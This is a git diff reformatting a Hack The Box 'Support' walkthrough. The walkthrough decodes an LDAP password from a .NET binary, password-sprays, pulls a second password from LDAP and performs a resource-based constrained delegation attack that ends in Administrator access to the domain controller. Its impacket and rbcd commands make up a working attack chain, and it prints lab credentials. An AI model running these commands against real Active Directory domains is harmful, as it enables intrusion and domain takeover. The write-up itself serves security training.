@@ -22,21 +22,31 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 ## Enumeration
-# SMB
+### SMB
 - We have read access into the "support-tools" share
-- ![[anonymous_shares.png]](/images/HTB/Support/anonymous_shares.png)
+
+![[anonymous_shares.png]](/images/HTB/Support/anonymous_shares.png)
+
 - In the share there is a bunch of tools but only "UserInfo.exe.zip" seems interesting
-- ![[rid_brute.png]](/images/HTB/Support/rid_brute.png)
+
+![[rid_brute.png]](/images/HTB/Support/rid_brute.png)
+
+
 - Since we have IPC$ access, we can rid brute force to get users
-- Command to get list of users from output:
+
+- We can take the output from CrackMapExec and use this command to get list of users from output:
 ```bash
 cat list.txt| awk {'print $6'} | cut -d '\' -f 2 > users.txt
 ```
-# DNSpy
+
+### DNSpy
+We can use [DNSpy](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiyg4e5kKWAAxUgD1kFHV8oAx4QFnoECA4QAQ&url=https%3A%2F%2Fgithub.com%2FdnSpy%2FdnSpy&usg=AOvVaw3AGGPY0vEaQaLhf3K6Mxfc&opi=89978449) to analyze and decompile a .NET executable
 - Under LdapQuery in UserInfo.Services, we see an encoded password and key being xored
 - ![[dnspy_enc_passwd.png]](/images/HTB/Support/dnspy_enc_passwd.png)
-- Pass: ```0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E```
-- Key: ```armando : 61 72 6d 61 6e 64 6f```
+
+Pass: ```0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E```
+
+Key: ```armando : 61 72 6d 61 6e 64 6f```
 
 ```csharp
 namespace UserInfo.Services
@@ -66,23 +76,28 @@ namespace UserInfo.Services
 ```
 Steps for getting the password - I used [CyberChef](https://gchq.github.io/CyberChef/) 
 - Base64 decode
-- xor twice with keys ``
-- PW: ```nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz```
+- xor twice with key
+
+PW: ```nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz```
 
 
-# Password Spray
+## Password Spray
 - Once we obtain the password, we can password spray with our user list
 - ![[ldap_pass_spray.png]](/images/HTB/Support/ldap_pass_spray.png)
 
 
 - We find that the ldap user is valid ```ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz```
 
-# Bloodhound
+## Bloodhound
 - Nothing interesting from bloodhound with the ldap user
 - support user is part of Remote  Management Users
-- ![[BH_RMU.png]](/images/HTB/Support/BH_RMU.png)
-## NMAP P2
+
+![[BH_RMU.png]](/images/HTB/Support/BH_RMU.png)
+
+## NMAP Part 2
+
 - Running nmap again (all ports) we find 5985 open, WinRM!
+
 ```bash
 Not shown: 65516 filtered tcp ports (no-response)
 PORT      STATE SERVICE       REASON          VERSION
@@ -109,28 +124,42 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 ## Checking WinRM with CME
+
 - No one from our list with the password above can remote in, we need support user
-# Enumerating LDAP
+
+## Enumerating LDAP
+
 ```bash
 ldapdomaindump ldap://10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
 ```
+
 ```bash
 ldapsearch -x -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D "CN=ldap,CN=Users,DC=support,DC=htb" -b "DC=support,DC=htb"
 ```
+
 ```bash
 ldapsearch -x -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D "CN=ldap,CN=Users,DC=support,DC=htb" -b "CN=support,CN=Users,DC=support,DC=htb" 
 ```
 
 - There are a bunch of files in the ldapdomaindump we can look through for the search base
 - By specifying the support user in the search base, we can see the password in the "info" section
-```support : Ironside47pleasure40Watchful```
-- ![[support_ldap_pw.png]](/images/HTB/Support/support_ldap_pw.png)
+
+```text
+support : Ironside47pleasure40Watchful
+```
+
+![[support_ldap_pw.png]](/images/HTB/Support/support_ldap_pw.png)
+
 - Check with CME: ![[cme_winrm_support.png]](/images/HTB/Support/cme_winrm_support.png)
 - We can remote in!
+
 ## Enumeration as support
-# Bloodhound
+
+### Bloodhound
 - Looking through at our node, we can see we are a part of "Shared Support Accounts" which has "GenericAll" over the Domain Controller
-- ![[BH_edges.png]](/images/HTB/Support/BH_edges.png)
+
+![[BH_edges.png]](/images/HTB/Support/BH_edges.png)
+
 - What does this mean? Full control of a computer object can be used to perform a resource based constrained delegation attack.
 
 [Follwing hacktricks guide for creating the fake computer](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegationhttps://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
@@ -154,24 +183,30 @@ Get-ADComputer DC$ -Properties PrincipalsAllowedToDelegateToAccount
 ![[new_fake_com.png]](/images/HTB/Support/new_fake_com.png)
 
 - Next, we can use this [script](https://github.com/tothi/rbcd-attack) to allow us to delegate as Administrator by editing the "msDs-AllowedToActOnBehalfOfOtherIdentity" attribute
+
 ```bash
 python rbcd-attack/rbcd.py support.htb\\support:Ironside47pleasure40Watchful -dc-ip 10.10.11.174 -t DC -f TURCO
 ```
-- ![[attribute_edit_success.png]](/images/HTB/Support/attribute_edit_success.png)
+
+![[attribute_edit_success.png]](/images/HTB/Support/attribute_edit_success.png)
+
 - We can also verify everything worked using "impacket-rbcd"
 
 ```bash
 impacket-rbcd support.htb/support:Ironside47pleasure40Watchful -delegate-to 'DC$' -action read -dc-ip 10.10.11.174
 ```
-- ![[impacket-rbcd_proof.png]](/images/HTB/Support/impacket-rbcd_proof.png)
+![[impacket-rbcd_proof.png]](/images/HTB/Support/impacket-rbcd_proof.png)
 
 - Lastly, we create the ST using the "ldap/dc.support.htb" SPN 
+
 ```bash
 impacket-getST support.htb/TURCO$:turco123! -spn 'ldap/dc.support.htb' -impersonate Administrator -dc-ip 10.10.11.174
 ```
 
 - Now we can wmiexec into the Domain Controller as Admin!
-- ![[PWNED.png]](/images/HTB/Support/PWNED.png)
+
+![[PWNED.png]](/images/HTB/Support/PWNED.png)
+
 ```bash
 KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass support.htb/Administrator@dc.support.htb -dc-ip 10.10.11.174
 ```
